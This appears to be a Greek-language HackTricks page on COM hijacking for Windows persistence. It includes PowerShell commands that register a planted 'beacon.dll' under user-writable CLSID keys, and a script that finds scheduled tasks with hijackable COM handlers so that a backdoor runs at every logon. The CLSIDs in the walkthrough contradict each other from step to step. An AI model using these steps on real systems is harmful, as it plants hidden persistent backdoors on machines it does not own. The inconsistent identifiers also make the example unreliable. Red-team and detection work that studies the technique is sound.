# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Αναζητώντας ανύπαρκτα COM components

Καθώς οι τιμές του HKCU μπορούν να τροποποιηθούν από τους χρήστες, **COM Hijacking** θα μπορούσε να χρησιμοποιηθεί ως **μόνιμη μηχανισμός**. Χρησιμοποιώντας το `procmon`, είναι εύκολο να βρείτε αναζητημένα COM registry που δεν υπάρχουν και που ένας επιτιθέμενος θα μπορούσε να δημιουργήσει για να παραμείνει. Φίλτρα:

- **RegOpenKey** operations.
- όπου το _Result_ είναι **NAME NOT FOUND**.
- και το _Path_ τελειώνει με **InprocServer32**.

Μόλις αποφασίσετε ποιο ανύπαρκτο COM να προσποιηθείτε, εκτελέστε τις παρακάτω εντολές. _Να είστε προσεκτικοί αν αποφασίσετε να προσποιηθείτε ένα COM που φορτώνεται κάθε λίγα δευτερόλεπτα, καθώς αυτό θα μπορούσε να είναι υπερβολικό._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Τα Windows Tasks χρησιμοποιούν Custom Triggers για να καλέσουν COM αντικείμενα και επειδή εκτελούνται μέσω του Task Scheduler, είναι πιο εύκολο να προβλέψουμε πότε θα ενεργοποιηθούν.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ελέγχοντας την έξοδο, μπορείτε να επιλέξετε μία που θα εκτελείται **κάθε φορά που συνδέεται ένας χρήστης** για παράδειγμα.

Τώρα αναζητώντας το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στο **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** και στο HKLM και HKCU, συνήθως θα διαπιστώσετε ότι η τιμή δεν υπάρχει στο HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Στη συνέχεια, μπορείτε απλά να δημιουργήσετε την καταχώρηση HKCU και κάθε φορά που ο χρήστης συνδέεται, η πίσω πόρτα σας θα ενεργοποιείται.

{{#include ../../banners/hacktricks-training.md}}
